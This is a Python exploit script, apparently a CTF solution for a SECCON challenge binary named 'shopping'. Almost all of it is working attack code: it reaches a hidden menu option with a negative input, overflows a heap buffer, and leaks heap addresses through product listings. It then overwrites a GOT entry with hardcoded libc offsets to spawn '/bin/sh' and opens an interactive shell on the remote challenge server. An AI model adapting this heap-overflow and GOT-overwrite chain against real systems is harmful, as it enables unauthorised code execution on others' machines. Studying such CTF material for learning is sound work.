import pwnbox,struct
pack = lambda x : struct.pack("<Q",x)
unpack = lambda x: struct.unpack("<Q",x)[0]
#p = pwnbox.pipe.ProcessPipe("./shopping")
#p = pwnbox.pipe.SocketPipe("127.0.0.1",9999)
p = pwnbox.pipe.SocketPipe("shopping.pwn.seccon.jp",16294)

def shop_mode():
  p.read_until(":")
  p.write("1\n")

def custom_mode():
  p.read_until(":")
  p.write("2\n")

def bug_mode():
  p.read_until(":")
  p.write("-1\n")
  
def out():
  p.read_until(":")
  p.write("0\n")

def add_product(name, price,stock):
  p.read_until(":")
  p.write("1\n")
  p.read_until(">> ")
  p.write(name+"\n")
  p.read_until(">> ")
  p.write("%d\n"%price)
  p.read_until(">> ")
  p.write("%d\n"%stock)

def list_product():
  p.read_until(":")
  p.write("2\n")


def add_cart(name, amount):
  p.read_until(":")
  p.write("1\n")
  p.read_until(">> ")
  p.write(name+"\n")
  p.read_until(">> ")
  p.write("%d\n"%amount)

def buy():
  p.read_until(":")
  p.write("3\n")
  p.read_until(":")

def bug(name,crash):
  shop_mode()
  add_product("BOOJA",0x08000000,0x08000000)
  out()
  custom_mode()
  add_cart("BOOJA",0x11)
  buy()
  out()
  shop_mode()
  p.read_until("\n")
  p.write("y\n")
  p.read_until(":")
  p.write(name+"\n")
  p.read_until(":")
  p.write(crash+"\n")
  out()


bug("A"*0x30,"B"*0x30)
shop_mode()
for i in range(10):
  add_product("daramg%d"%i,0x10,0x100)
out()

def overflow(data):
  bug_mode()
  p.read_until(">>")
  p.write("y\n")
  p.read_until(":")
  p.write(data)
  p.read_until(">>")
  p.write("n\n")
def leak(adr):
  overflow("X"*(0xe0-0x20)+pack(adr)+"\n")
  shop_mode()
  list_product()
#  p.interact()
  p.read_until("009 : ")
  data= p.read_until("($10").split("($10")[0]
  heap =  unpack(data.ljust(8,"\x00"))
  out()
  return heap
custom_mode()
add_cart("daramg2",0x50)
out()
heap = leak(0x603118) 
cart = leak(0x603110) 
DIFF = cart-heap
print hex(heap)
print hex(cart)
custom_mode()
out()
def overwrite(target,value,origin):
  cnt = (origin -value) &0xffffffff
  overflow("X"*(DIFF-0x400+0x3a0)+pack(0)+pack(0x21)+pack(target-0x10)+struct.pack("<I",cnt)+"\n")
  custom_mode()
  buy()
  out()

target = 0x603028
value = 0x7f2bf0da4380
origin = 0x7f2bf0de9cf0
value = 0x0000000000046590
origin = 0x889b0
overwrite(target,value,origin)
#overwrite(0x603018, 0x7f74215ac380,0x7f7421949d80)
p.write("1\n")
p.write("1\n")
p.write("/bin/sh\n")

p.interact()
